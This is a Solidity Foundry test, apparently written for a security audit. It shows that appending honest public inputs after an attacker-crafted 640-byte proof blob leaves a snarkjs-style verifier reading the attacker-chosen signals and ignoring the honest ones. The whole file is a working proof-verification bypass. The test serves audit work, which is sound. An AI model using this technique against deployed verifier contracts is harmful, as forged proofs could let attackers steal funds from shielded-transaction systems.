// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

contract Target {
    // Mirrors the snarkjs verifier signature shape: all-static calldata params.
    function verifyProof(
        uint256[2] calldata _pA,
        uint256[2][2] calldata _pB,
        uint256[2] calldata _pC,
        uint256[12] calldata _pubSignals
    ) public pure returns (bool) {
        // return whether the FIRST public signal equals 0xdead (attacker-chosen)
        _pA;
        _pB;
        _pC;
        return _pubSignals[0] == 0xdead;
    }
}

contract AuditTrailingCalldata is Test {
    Target t;

    function setUp() public {
        t = new Target();
    }

    function test_trailingCalldataIgnored() public {
        // "proof" blob crafted by the attacker: 8 words of pA/pB/pC + 12 words
        // of ATTACKER-CHOSEN public signals = 20 words = 640 bytes.
        bytes memory attackerProof = new bytes(0);
        for (uint256 i = 0; i < 8; i++) {
            attackerProof = abi.encodePacked(attackerProof, uint256(0));
        }
        // attacker-chosen pubSignals[0] = 0xdead, rest zero
        attackerProof = abi.encodePacked(attackerProof, uint256(0xdead));
        for (uint256 i = 1; i < 12; i++) {
            attackerProof = abi.encodePacked(attackerProof, uint256(0));
        }
        assertEq(attackerProof.length, 640);

        // The contract appends its own honest, computed public inputs AFTER the
        // proof blob, exactly as ShieldedTransactionLogic.toVerifierInput does.
        bytes memory honestPubInputs = new bytes(0);
        for (uint256 i = 0; i < 12; i++) {
            honestPubInputs = abi.encodePacked(
                honestPubInputs,
                uint256(0xC0FFEE)
            );
        }

        bytes memory vParams = abi.encodePacked(attackerProof, honestPubInputs);

        (bool ok, bytes memory ret) = address(t).staticcall(
            bytes.concat(Target.verifyProof.selector, vParams)
        );

        console2.log("call succeeded:", ok);
        console2.log("returned true (attacker pubSignals used):", abi.decode(ret, (bool)));

        assertTrue(ok, "call should NOT revert on trailing calldata");
        assertTrue(
            abi.decode(ret, (bool)),
            "verifier read ATTACKER-supplied pubSignals, honest inputs ignored"
        );
    }
}
